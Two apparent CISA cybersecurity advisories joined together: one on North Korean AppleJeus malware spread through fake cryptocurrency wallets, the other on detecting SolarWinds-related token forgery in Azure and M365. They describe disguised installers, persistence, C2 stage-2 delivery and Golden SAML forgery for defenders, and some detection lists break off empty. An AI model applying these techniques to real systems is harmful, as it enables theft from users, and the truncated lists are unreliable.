The payload for the Windows malware is a Windows Dynamic-Link-Library. UnionCryptoUpdater.exe does not immediately download the stage 2 malware but instead downloads it after a time specified by the C2 server. This delay could be implemented to prevent researchers from directly obtaining the stage 2 malware.
The macOS X malware’s payload could not be downloaded, as the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the macOS X payload. The macOS X payload is likely similar in functionality to the Windows stage 2 detailed above.
For more details on AppleJeus Version 3: Union Crypto, see MAR-10322463-3.v1.
Commonalities between Celas Trade Pro, JMT Trading, and Union Crypto
Hardcoded Values
In each AppleJeus version, there are hardcoded values used for encryption or to create a signature when combined with the time (table 1).
Table 1: AppleJeus hardcoded values and uses

 
The Union Crypto Trader and Celas LLC (XOR) values are 16 bytes in length. For JMT Trader, the first 16 bytes of the Windows and macOS X values are identical, and the additional bytes are in a time format for the Windows sample. The structure of a 16-byte value combined with the time is also used in Union Crypto Trader to create the auth_signature.
As mentioned, FALLCHILL was reported as the final payload for Celas Trade Pro. All FALLCHILL samples use 16-byte hardcoded RC4 keys for sending data, similar to the 16-byte keys in the AppleJeus samples.
Open-Source Cryptocurrency Applications
All three AppleJeus samples are bundled with modified copies of legitimate cryptocurrency applications and can be used as originally designed to trade cryptocurrency. Both Celas LLC and JMT Trader modified the same cryptocurrency application, Q.T. Bitcoin Trader; Union Crypto Trader modified the Blackbird Bitcoin Arbitrage application.
Postinstall Scripts, Property List Files, and LaunchDaemons
The macOS X samples of all three AppleJeus versions contain postinstall scripts with similar logic. The Celas LLC postinstall script only moves the plist file to a new location and launches Updater with the CheckUpdate parameter in the background. The JMT Trader and Union Crypto Trader also perform these actions and have identical functionality. The additional actions performed by both postinstall scripts are to change the file permissions on the plist, make a new directory in the /Library folder, move CrashReporter or UnionCryptoUpdater to the newly created folder, and make them executable.
The plist files for all three AppleJeus files have identical functionality. They only differ in the files’ names and one default comment that was not removed from the Celas LLC plist. As the logic and functionality of the postinstall scripts and plist files are almost identical, the LaunchDaemons created also function the same.
They will all launch the secondary executable as Root on system load for every user.
AppleJeus Version 4: Kupay Wallet
Introduction and Infrastructure
On March 13, 2020, a new version of the AppleJeus malware was identified. The malware was marketed and distributed by a legitimate-looking company, called Kupay Wallet, on their website kupaywallet,.,com (Acquire Infrastructure: Domain,).
The domain www.kupaywallet,.,com resolved to IP address 104.200.67,.,96 from March 20, 2020, to January 16, 2021. CrownCloud US, LLC controlled the IP address (autonomous system number,ASN, 8100), and is located in New York, NY.
The domain www.kupaywallet,.,com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Kupay Wallet Application Analysis
Windows Program
The Windows version of the malicious cryptocurrency application is an MSI Installer. The MSI executes the following actions.

Installs Kupay.exe in folder C:\Program Files (x86)\Kupay
Installs KupayUpgrade.exe in folder C:\Users\<username>\AppData\Roaming\KupaySupport
Runs KupayUpgrade.exe

The program Kupay.exe loads a legitimate-looking cryptocurrency wallet platform, which exhibits no signs of malicious activity and is very similar to an open-source platform known as Copay, distributed by Atlanta-based company BitPay.
The program KupayUpgrade.exe first installs itself as a service (Create or Modify System Process: Windows Service,), which will automatically start when any user logs on (Boot or Logon Autostart Execution,). The service is installed with a description stating it is an “Automatic Kupay Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery,), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel,).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Kupay in folder /Applications/Kupay.app/Contents/MacOS/
Installs kupay_upgrade in folder /Applications/Kupay.app/Contents/MacOS/
Executes a postinstall script

Creates KupayDaemon folder in /Library/Application Support folder
Moves kupay_upgrade to the new folder
Moves com.kupay.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs the command launchctl load to load the plist without a restart
Runs kupay_upgrade in the background



Kupay is likely a copy of an open-source cryptocurrency wallet application, loads a legitimate-looking wallet program (fully functional), and its functionality is identical to the Windows Kupay.exe program.
The kupay_upgrade program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “Kupay Wallet 9.0.1 (Check Update Osx)” (Application Layer Protocol: Web Protocols,). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/kupay_update with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter,). Stage 2 is then launched, and the malware, kupay_upgrade, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols,).
The postinstall script has similar functionality to other AppleJeus scripts (Command and Scripting Interpreter: Unix Shell,). It creates the KupayDaemon folder in /Library/Application Support folder and then moves kupay_upgrade to the new folder. It moves the property list (plist) file com.kupay.pkg.wallet.plist from the Installer package to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd,). The script runs the command launchctl load to load the plist without a restart (Command and Scripting Interpreter,). But, since the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches kupay_upgrade and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
The Windows malware’s payload could not be downloaded since the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.
The stage 2 payload for the macOS X malware was decoded and analyzed. The stage 2 malware has a variety of functionalities. Most importantly, it checks in with a C2 and, after connecting to the C2, can send or receive a payload, read and write files, execute commands via the terminal, etc.
For more details on AppleJeus Version 4: Kupay Wallet, see MAR-10322463-4.v1.
AppleJeus Version 5: CoinGoTrade
Introduction and Infrastructure
In early 2020, another version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called CoinGoTrade on their website coingotrade,.,com (Acquire Infrastructure: Domain,).
The domain CoinGoTrade,.,com resolved to IP address 198.54.114,.,175 from February 28, 2020, to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for Dorusio,.,com and Ants2Whale,.,com.
The domain CoinGoTrade,.,com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
CoinGoTrade Application Analysis
Windows Program
The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will execute the following actions.

Installs CoinGoTrade.exe in folder C:\Program Files (x86)\CoinGoTrade
Installs CoinGoTradeUpdate.exe in folder C:\Users\<username>\AppData\Roaming\CoinGoTradeSupport
Runs CoinGoTradeUpdate.exe

CoinGoTrade.exe loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.
CoinGoTradeUpdate.exe first installs itself as a service (Create or Modify System Process: Windows Service,), which will automatically start when any user logs on (Boot or Logon Autostart Execution,). The service is installed with a description stating it is an “Automatic CoinGoTrade Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery,), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel,).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs CoinGoTrade in folder /Applications/CoinGoTrade.app/Contents/MacOS/
Installs CoinGoTradeUpgradeDaemon in folder /Applications/CoinGoTrade.app/Contents/MacOS/
Executes a postinstall script

Creates CoinGoTradeService folder in /Library/Application Support folder
Moves CoinGoTradeUpgradeDaemon to the new folder
Moves com.coingotrade.pkg.product.plist to folder /Library/LaunchDaemons/
Runs CoinGoTradeUpgradeDaemon in the background



The CoinGoTrade program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking, fully functional wallet program).
The CoinGoTradeUpgradeDaemon program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “CoinGoTrade 1.0 (Check Update Osx)” (Application Layer Protocol: Web Protocols,). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/updatecoingotrade with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter,). Stage 2 is then launched, and the malware, CoinGoTradeUpgradeDaemon, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols,).
The postinstall script has similar functionality to the other scripts (Command and Scripting Interpreter: Unix Shell,) and installs CoinGoTrade and CoinGoTradeUpgradeDaemon in folder /Applications/CoinGoTrade.app/Contents/MacOS/. It moves the property list (plist) file com.coingotrade.pkg.product.plist to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd,). Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches CoinGoTradeUpgradeDaemon and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
The Windows malware’s payload could not be downloaded because the C2 server is no longer accessible. Additionally, none of the open-source reporting for this sample contained copies of the payload. The Windows payload is likely similar in functionality to the macOS X stage 2 detailed below.
The stage 2 payload for the macOS X malware was no longer available from the specified download URL. Still, a file was submitted to VirusTotal by the same user on the same date as the macOS X CoinGoTradeUpgradeDaemon. These clues suggest that the submitted file may be related to the macOS X version of the malware and the downloaded payload.
The file prtspool is a 64-bit Mach-O executable with a large variety of features that have all been confirmed as functionality. The file has three C2 URLs hardcoded into the file and communicates to these with HTTP POST multipart-form data boundary string. Like other HIDDEN COBRA malware, prtspool uses format strings to store data collected about the system and sends it to the C2s.
For more details on AppleJeus Version 5: CoinGoTrade, see MAR-10322463-5.v1.
AppleJeus Version 6: Dorusio
Introduction and Infrastructure
In March 2020, an additional version of the AppleJeus malware was identified. This time the malware was marketed and distributed by a legitimate-looking company called Dorusio on their website, dorusio,.,com (Acquire Infrastructure: Domain,). Researchers collected samples for Windows and macOS X versions of the Dorusio Wallet (Develop Capabilities: Malware,). As of at least early 2020, the actual download links result in 404 errors. The download page has release notes with version revisions claiming to start with version 1.0.0, released on April 15, 2019.
The domain dorusio,.,com resolved to IP address 198.54.115,.,51 from March 30, 2020 to January 23, 2021. The IP address is controlled by NameCheap Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade,.,com and Ants2Whale,.,com.
The domain dorusio,.,com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Dorusio Application Analysis
Windows Program
The Windows version of the malicious application is an MSI Installer. The installer appears to be legitimate and will install the following two programs.

Installs Dorusio.exe in folder C:\Program Files (x86)\Dorusio
Installs DorusioUpgrade.exe in folder C:\Users\<username>\AppData\Roaming\DorusioSupport
Runs DorusioUpgrade.exe

The program, Dorusio.exe, loads a legitimate-looking cryptocurrency wallet platform with no signs of malicious activity and is a copy of an open-source cryptocurrency application.
The program DorusioUpgrade.exe first installs itself as a service (Create or Modify System Process: Windows Service,), which will automatically start when any user logs on (Boot or Logon Autostart Execution,). The service is installed with a description stating it “Automatic Dorusio Upgrade.” When launched, it collects the victim’s host information (System Owner/User Discovery,), combines the information in strings before exfiltration, and sends it to a C2 website (Exfiltration Over C2 Channel,).
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Dorusio in folder /Applications/Dorusio.app/Contents/MacOS/
Installs Dorusio_upgrade in folder /Applications/Dorusio.app/Contents/MacOS/
Executes a postinstall script

Creates DorusioDaemon folder in /Library/Application Support folder
Moves Dorusio_upgrade to the new folder
Moves com.dorusio.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs Dorusio_upgrade in the background



The Dorusio program is likely a copy of an open-source cryptocurrency wallet application and loads a legitimate-looking wallet program (fully functional). Aside from the Dorusio logo and two new services, the wallet appears to be the same as the Kupay Wallet. This application seems to be a modification of the open-source cryptocurrency wallet Copay distributed by Atlanta-based company BitPay.
The Dorusio_upgrade program calls its function CheckUpdate (which contains most of the logic functionality of the malware) and sends a POST to the C2 server with a connection named “Dorusio Wallet 2.1.0 (Check Update Osx)” (Application Layer Protocol: Web Protocols,). If the C2 server returns a file, it is decoded and written to the victim’s folder /private/tmp/Dorusio_update with permissions set by the command chmod 700 (only the user can read, write, and execute) (Command and Scripting Interpreter,). Stage 2 is then launched, and the malware, Dorusio_upgrade, returns to sleeping and checking in with the C2 server at predetermined intervals (Application Layer Protocol: Web Protocols,).
The postinstall script has similar functionality to other AppleJeus scripts (Command and Scripting Interpreter: Unix Shell,). It creates the DorusioDaemon folder in /Library/Application Support folder and then moves Dorusio_upgrade to the new folder. It moves the property list (plist) file com.dorusio.pkg.wallet.plist from the Installer package to the /Library/LaunchDaemons/ folder (Scheduled Task/Job: Launchd,). Because the LaunchDaemon will not run automatically after the plist file is moved, the postinstall script launches Dorusio_upgrade and runs it in the background (Create or Modify System Process: Launch Daemon,).
Payload
Neither the payload for the Windows nor macOS X malware could be downloaded; the C2 server is no longer accessible. The payloads are likely similar in functionality to the macOS X stage 2 from CoinGoTrade and Kupay Wallet, or the Windows stage 2 from Union Crypto.
For more details on AppleJeus Version 6: Dorusio, see MAR-10322463-6.v1.
AppleJeus 4, 5, and 6 Installation Conflictions
If a user attempts to install the Kupay Wallet, CoinGoTrade, and Dorusio applications on the same system, they will encounter installation conflicts.
If Kupay Wallet is already installed on a system and the user tries to install CoinGoTrade or Dorusio:

Pop-up windows appear, stating a more recent version of the program is already installed.

If CoinGoTrade is already installed on a system and the user attempts to install Kupay Wallet:

Kupay.exe will be installed in the C:\Program Files (x86)\CoinGoTrade\ folder.
All CoinGoTrade files will be deleted.
The folders and files contained in the C:\Users\<username>\AppData\Roaming\CoinGoTradeSupport will remain installed.
KupayUpgrade.exe is installed in the new folder C:\Users\<username>\AppData\Roaming\KupaySupport.

If Dorusio is already installed on a system and the user attempts to install Kupay Wallet:

Kupay.exe will be installed in the C:\Program Files (x86)\Dorusio\ folder.
All Dorusio.exe files will be deleted.
The folders and files contained in C:\Users\<username>\AppData\Roaming\DorusioSupport will remain installed.
KupayUpgrade.exe is installed in the new folder C:\Users\<username>\AppData\Roaming\KupaySupport.

AppleJeus Version 7: Ants2Whale
Introduction and Infrastructure
In late 2020, a new version of AppleJeus was identified called “Ants2Whale.” The site for this version of AppleJeus is ants2whale,.,com (Acquire Infrastructure: Domain,). The website shows a legitimate-looking cryptocurrency company and application. The website contains multiple spelling and grammar mistakes indicating the creator may not have English as a first language. The website states that to download Ants2Whale, a user must contact the administrator, as their product is a “premium package” (Develop Capabilities: Malware,).
The domain ants2whale,.,com resolved to IP address 198.54.114,.,237 from September 23, 2020, to January 22, 2021. The IP address is controlled by NameCheap, Inc. (ASN 22612) and is located in Atlanta, GA. This IP address is in the same ASN for CoinGoTrade,.,com and Dorusio,.,com.
The domain ants2whale,.,com had a valid Sectigo SSL certificate (Obtain Capabilities: Digital Certificates,). The SSL certificate was “Domain Control Validated,” a weak security verification level that does not require validation of the owner’s identity or the actual business’s existence.
Ants2Whale Application Analysis
Windows Program
As of late 2020, the Windows program was not available on VirusTotal. It is likely very similar to the macOS X version detailed below.
macOS X Program
The macOS version of the malicious application is a DMG Installer. The installer looks legitimate and has very similar functionality to the Windows version, but it does not have a digital certificate and will warn the user of that before installation. The installer executes the following actions.

Installs Ants2Whale in folder /Applications/Ants2whale.app/Contents/MacOS/Ants2whale
Installs Ants2WhaleHelper in folder /Library/Application Support/Ants2WhaleSupport/
Executes a postinstall script

Moves com.Ants2whale.pkg.wallet.plist to folder /Library/LaunchDaemons/
Runs Ants2WhaleHelper in the background



The Ants2Whale and Ants2WhaleHelper programs and the postinstall script function almost identically to previous versions of AppleJeus and will not be discussed in depth in this advisory.
For more details on AppleJeus Version 7: Ants2Whale, see MAR-10322463-7.v1.
ATT&CK Profile
Figure 2 and table 2 provide summaries of the MITRE ATT&CK techniques observed.

Figure 2: MITRE ATT&CK enterprise techniques used by AppleJeus
 
Table 2: MITRE ATT&CK techniques observed


Mitigations

Compromise Mitigations
Organizations that identify AppleJeus malware within their networks should take immediate action. Initial actions should include the following steps.

Contact the FBI, CISA, or Treasury immediately regarding any identified activity related to AppleJeus. (Refer to the Contact Information section below.)
Initiate your organization’s incident response plan.
Generate new keys for wallets, and/or move to new wallets.
Introduce a two-factor authentication solution as an extra layer of verification.  
Use hardware wallets, which keep the private keys in a separate, secured storage area.
To move funds out off a compromised wallet:

Do not use the malware listed in this advisory to transfer funds, and  
Form all transactions offline and then broadcast them to the network all at once in a short online session, ideally prior to the attacker accessing them.


Remove impacted hosts from network.
Assume the threat actors have moved laterally within the network and downloaded additional malware.
Change all passwords to any accounts associated with impacted hosts.
Reimage impacted host(s).  
Install anti-virus software to run daily deep scans of the host.
Ensure your anti-virus software is setup to download the latest signatures daily.
Install a Host Based Intrusion Detection (HIDS)-based software and keep it up to date.
Ensure all software and hardware is up to date, and all patches have been installed.
Ensure network-based firewall is installed and/or up to date.
Ensure the firewall’s firmware is up to date.

Pro-Active Mitigations
Consider the following recommendations for defense against AppleJeus malware and related activity.
Cryptocurrency Users

Verify source of cryptocurrency-related applications.
Use multiple wallets for key storage, striking the appropriate risk balance between hot and cold storage.
Use custodial accounts with multi-factor authentication mechanisms for both user and device verification.
Patronize cryptocurrency service businesses that offer indemnity protections for lost or stolen cryptocurrency.
Consider having a dedicated device for cryptocurrency management.

Financial Service Companies

Verify compliance with Federal Financial Institutions Examination Council (FFIEC) handbooks at https://ithandbook.ffiec.gov, especially those related to information security.
Report suspicious cyber and financial activities. For more information on mandatory and voluntary reporting of cyber events via suspicious activity reports, see the Financial Crimes Enforcement Network (FinCEN) Advisory FIN-2016-A005: Advisory to Financial Institutions on Cyber- Events and Cyber-Enabled Crime at https://www.fincen.gov/sites/default/files/advisory/2016-10-25/Cyber%20Threats%20Advisory%20-%20FINAL%20508_2.pdf and FinCEN’s Section 314(b) Fact Sheet at https://www.fincen.gov/sites/default/files/shared/314bfactsheet.pdf.

Cryptocurrency Businesses

Verify compliance with the Cryptocurrency Security Standard at http://cryptoconsortium.github.io/CCSS/.

All Organizations

Incorporate IOCs identified in CISA’s Malware Analysis Reports on https://us-cert.cisa.gov/northkorea into intrusion detection systems and security alert systems to enable active blocking or reporting of suspected malicious activity.
See table 3 below, which provides a summary of preventative ATT&CK mitigations based on observed techniques.

Table 3: MITRE ATT&CK mitigations based on observed techniques

 

Contact Information

Recipients of this report are encouraged to contribute any additional information that they may have related to this threat.
For any questions related to this report or to report an intrusion and request resources for incident response or technical assistance, please contact:

The FBI through the FBI Cyber Division (855-292-3937 or CyWatch@fbi.gov) or a local field office,
CISA (888-282-0870 or Central@cisa.dhs.gov), or
Treasury Office of Cybersecurity and Critical Infrastructure Protection (Treasury OCCIP) (202-622-3000 or OCCIP-Coord@treasury.gov).


References,1, CISA Alert AA20-239A: FASTCash 2.0: North Korea's BeagleBoyz Robbing Banks,2, Department of the Treasury Press Release: Treasury Sanctions Individuals Laundering Cryptocurrency for Lazarus Group,3, Department of Justice Press Release: Two Chinese Nationals Charged with Laundering Over $100 Million in Cryptocurrency From Exchange Hack,4, CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL,5, CISA Alert TA17-318A: HIDDEN COBRA – North Korean Remote Administration Tool: FALLCHILL,6, MITRE ATT&CK Software: FALLCHILL,7, SecureList: Operation AppleJeus Sequel,8, GitHub: Blackbird Bitcoin Arbitrage

Revisions

February 17, 2021: Initial Version|April 15, 2021: Updated MITRE ATT&CK technique from Command and Scripting Interpreter: AppleScript, to Command and Scripting Interpreter: Unix Shell,.






This product is provided subject to this Notification and this Privacy & Use policy.


",https://www.cisa.gov/news-events/cybersecurity-advisories/aa21-048a
68,"




Summary

This Advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
Updated April 15, 2021: The U.S. Government attributes this activity to the Russian Foreign Intelligence Service (SVR). Additional information may be found in a statement from the White House. For more information on SolarWinds-related activity, go to https://us-cert.cisa.gov/remediating-apt-compromised-networks and https://www.cisa.gov/supply-chain-compromise.
This Alert is a companion alert to AA20-352A: Advanced Persistent Threat Compromise of Government Agencies, Critical Infrastructure, and Private Sector Organizations. AA20-352A primarily focuses on an advanced persistent threat (APT) actor’s compromise of SolarWinds Orion products as an initial access vector into networks of U.S. Government agencies, critical infrastructure entities, and private network organizations. As noted in AA20-352A, the Cybersecurity and Infrastructure Security Agency (CISA) has evidence of initial access vectors in addition to the compromised SolarWinds Orion products.
This Alert also addresses activity—irrespective of the initial access vector leveraged—that CISA attributes to an APT actor. Specifically, CISA has seen an APT actor using compromised applications in a victim’s Microsoft 365 (M365)/Azure environment. CISA has also seen this APT actor utilizing additional credentials and Application Programming Interface (API) access to cloud resources of private and public sector organizations. These tactics, techniques, and procedures (TTPs) feature three key components:

Compromising or bypassing federated identity solutions;
Using forged authentication tokens to move laterally to Microsoft cloud environments; and
Using privileged access to a victim’s cloud environment to establish difficult-to-detect persistence mechanisms for Application Programming Interface (API)-based access.

This Alert describes these TTPs and offers an overview of, and guidance on, available open-source tools—including a CISA-developed tool, Sparrow—for network defenders to analyze their Microsoft Azure Active Directory (AD), Office 365 (O365), and M365 environments to detect potentially malicious activity.
Note: this Alert describes artifacts—presented by these attacks—from which CISA has identified detectable evidence of the threat actor’s initial objectives. CISA continues to analyze the threat actor’s follow-on objectives.

Technical Details

Frequently, CISA has observed the APT actor gaining Initial Access [TA0001] to victims’ enterprise networks via compromised SolarWinds Orion products (e.g., Solorigate, Sunburst).[1] However, CISA is investigating instances in which the threat actor may have obtained initial access by Password Guessing [T1110.001], Password Spraying [T1110.003], and/or exploiting inappropriately secured administrative or service credentials (Unsecured Credentials [T1552]) instead of utilizing the compromised SolarWinds Orion products.
CISA observed this threat actor moving from user context to administrator rights for Privilege Escalation [TA0004] within a compromised network and using native Windows tools and techniques, such as Windows Management Instrumentation (WMI), to enumerate the Microsoft Active Directory Federated Services (ADFS) certificate-signing capability. This enumeration allows threat actors to forge authentication tokens (OAuth) to issue claims to service providers—without having those claims checked against the identity provider—and then to move laterally to Microsoft Cloud environments (Lateral Movement [TA0008]).
The threat actor has also used on-premises access to manipulate and bypass identity controls and multi-factor authentication. This activity demonstrates how sophisticated adversaries can use credentials from one portion of an organization to move laterally (Lateral Movement [TA0008]) through trust boundaries, evade defenses and detection (Defense Evasion [TA0005]), and steal sensitive data (Collection [TA0009]).
This level of compromise is challenging to remediate and requires a rigorous multi-disciplinary effort to regain administrative control before recovering.

Mitigations

Detection
Guidance on identifying affected SolarWinds software is well documented.[2] However—once an organization identifies a compromise via SolarWinds Orion products or other threat actor TTPs—identifying follow-on activity for on-premises networks requires fine-tuned network and host-based forensics.
The nature of cloud forensics is unique due to the growing and rapidly evolving technology footprints of major vendors. Microsoft's O365 and M365 environments have built-in capabilities for detecting unusual activity. Microsoft also provides premium services (Advanced Threat Protection [ATP] and Azure Sentinel), which enable network defenders to investigate TTPs specific to the Solorigate activity.[3]
Detection Tools
CISA is providing examples of detection tools for informational purposes only. CISA does not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services does not constitute or imply their endorsement, recommendation, or favoring by CISA.
There are a number of open-source tools available to investigate adversary activity in Microsoft cloud environments and to detect unusual activity, service principals, and application activity.[4] Publicly available PowerShell tools that network defenders can use to investigate M365 and Microsoft Azure include:

CISA's Sparrow,
Open-source utility Hawk, and
CrowdStrike's Azure Reporting Tool (CRT).

Additionally, Microsoft's Office 365 Management API and Graph API provide an open interface for ingesting telemetry and evaluating service configurations for signs of anomalous activity and intrusion.
Note: these open-source tools are highlighted and explained to assist with on-site investigation and remediation in cloud environments but are not all-encompassing. Open source tools can be complemented by services such as Azure Sentinel, a Microsoft premium service that provides comprehensive analysis tools, including custom detections for the activity indicated.
General Guidance on Using Detection Tools

Audit the creation and use of service principal credentials. Look for unusual application usage, such as use of dormant applications.
Audit the assignment of credentials to applications that allow non-interactive sign-in by the application. Look for unexpected trust relationships added to the Azure Active Directory.
Download the interactive sign-ins from the Azure admin portal or use the Microsoft Sentinel product. Review new token validation time periods with high values and investigate whether it was a legitimate change or an attempt to gain persistence by a threat actor.

Sparrow
CISA created Sparrow to help network defenders detect possible compromised accounts and applications in the Azure/M365 environment. The tool focuses on the narrow scope of user and application activity endemic to identity- and authentication-based attacks seen recently in multiple sectors. It is neither comprehensive nor exhaustive of available data. It is intended to narrow a larger set of available investigation modules and telemetry to those specific to recent attacks on federated identity sources and applications.
(Updated April 8, 2021): CISA has also created ""Aviary,"" which is a companion Splunk dashboard that can assist in visualizing and reviewing the output of Sparrow. Network defenders can find Aviary on CISA's Sparrow GitHub page. CISA advises network defenders to perform the following actions to use Sparrow:

Use Sparrow to detect any recent domain authentication or federation modifications.

Domain and federation modification operations are uncommon and should be investigated.


Examine logs for new and modified credentials applied to applications and service principals; delineate for the credential type. Sparrow can be used to detect the modification of service principals and application credentials.

Create a timeline for all credential changes, focusing on recent wholesale changes.
Review the “top actors” for activity in the environment and the number of credential modifications performed.
Monitor changes in application and service principal credentials.
Investigate any instances of excessive permissions being granted, including, but not limited to, Exchange Online, Microsoft Graph, and Azure AD Graph.


Use Sparrow to detect privilege escalation, such as adding a service principal, user, or group to a privileged role.
Use Sparrow to detect OAuth consent and users’ consent to applications, which is useful for interpreting changes in adversary TTPs.
Use Sparrow to identify anomalous Security Assertion Markup Language (SAML) token sign-ins by pivoting on the unified audit log UserAuthenticationValue of 16457, which is an indicator of how a SAML token was built and is a potential indicator for forged SAML tokens.

Note that this TTP has not been the subject of significant published security research but may indicate an unusual usage of a token, such as guest access for external partners to M365 resources.


Review the PowerShell logs that Sparrow exports.

Review PowerShell mailbox sign-ins and validate that the logins are legitimate actions.
Review PowerShell usage for users with PowerShell in the environment.


Use Sparrow to check the Graph API application permissions of all service principals and applications in M365/Azure AD.

Investigate unusual activity regarding Microsoft Graph API permissions (using either the legacy https://graph.windows.net/ or https://graph.microsoft.com). Graph is used frequently as part of these TTPs, often to access and manipulate mailbox resources.


Review Sparrow’s listed tenant’s Azure AD domains, to see if the domains have been modified.
For customers with G5 or E5 licensing levels, review MailItemsAccessed for insight into what application identification (ID) was used for accessing users’ mailboxes. Use Sparrow to query for a specific application ID using the app id investigation capability, which will check to see if it is accessing mail or file items.

The MailItemsAccessed event provides audibility for mailbox data accessed via mail protocols or clients.
By analyzing the MailItemsAccessed action, incident responders can determine which user mailbox items have been accessed and potentially exfiltrated by a threat actor. This event will be recorded even in some situations where the message was not necessarily read interactively (e.g., bind or sync).[5]
The resulting suspicious application ID can provide incident responders with a pivot to detect other suspicious applications that require additional analysis.
Check for changes to applications with regards to the accessing of resources such as mail or file items.



(Updated April 8, 2021): Aviary can be used to assist with performing the above tasks. To install Aviary, after running Sparrow:

Ingest comma separated values (CSV) output from the Sparrow PowerShell script into Splunk.

Sparrow output will have the following default filenames, which should not be modified: AppUpdate_Operations_Export.csv, AppRoleAssignment_Operations_Export.csv, Consent_Operations_Export.csv, Domain_List.csv, Domain_Operations_Export.csv, FileItems_Operations_Export.csv, MailItems_Operations_Export.csv, PSLogin_Operations_Export.csv, PSMailbox_Operations_Export.csv, SAMLToken_Operations_Export.csv, ServicePrincipal_Operations_Export.csv


Copy and paste the contents of the .xml file (aviary.xml in the root directory) into a new dashboard.
Use the data selection filters to point to the indexed Sparrow data (see figure 1)


                                                                                                                    Figure 1: Data Selection Filters
 
Hawk
Hawk is an open-source, PowerShell-driven, community-developed tool network defenders can use to quickly and easily gather data from O365 and Azure for security investigations. Incident responders and network defenders can investigate specific user principals or the entire tenant. Data it provides include IP addresses and sign-in data. Additionally, Hawk can track IP usage for concurrent login situations.
Hawk users should review login details for administrator accounts and take the following steps.
CrowdStrike Azure Reporting Tool
CrowdStrike's Azure Reporting Tool (CRT) can help network defenders analyze their Microsoft Azure AD and M365 environment to help organizations analyze permissions in their Azure AD tenant and service configuration. This tool has minor overlap with Sparrow; it shows unique items, but it does not cover the same areas. CISA is highlighting this tool because it is one of the only free, open-source tools available to investigate this activity and could be used to complement Sparrow.
Detection Tool Distinctions
Detection Methods
Microsoft breaks the threat actor’s recent activity into four primary stages, which are described below along with associated detection methods. Microsoft describes these stages as beginning with all activity after the compromise of the on-premises identity solution, such as ADFS.[6]
Note: this step provides an entry vector to cloud technology environments, and is unnecessary when the threat actor has compromised an identity solution or credential that allows the APT direct access to the cloud(e.g., without leveraging the SolarWinds Orion vulnerability).
Stage 1: Forging a trusted authentication token used to access resources that trust the on-premises identity provider
These attacks (often referred to as “Golden Security Assertion Markup Language” attacks) can be analyzed using a combination of cloud-based and standard on-premises techniques.[7] For example, network defenders can use OAuth claims for specific principals made at the Azure AD level and compare them to the on-premises identity.
Export sign-in logs from the Azure AD portal and look at the Authentication Method field.
Note: at portal.azure.com, click on a user and review the authentication details (e.g., date, method, result). Without Sentinel, this is the only way to get these logs, which are critical for this effort.
Detection Method 1: Correlating service provider login events with corresponding authentication events in Active Directory Federation Services (ADFS) and Domain Controllers
Using SAML single sign-on, search for any logins to service providers that do not have corresponding event IDs 4769, 1200, and 1202 in the domain.
Detection Method 2: Identifying certificate export events in ADFS
Look for:
Detection Method 3: Customizing SAML response to identify irregular access
This method serves as prevention for the future (and would only detect future, not past, activity), as it helps identify irregularities from the point of the change forward. Organizations can modify SAML responses to include custom elements for each service provider to monitor and detect any anomalous requests.[8]
Detection Method 4: Detecting malicious ADFS trust modification
A threat actor who gains administrative access to ADFS can add a new, trusted ADFS rather than extracting the certificate and private key as part of a standard Golden SAML attack.[9]
Network defenders should look for:
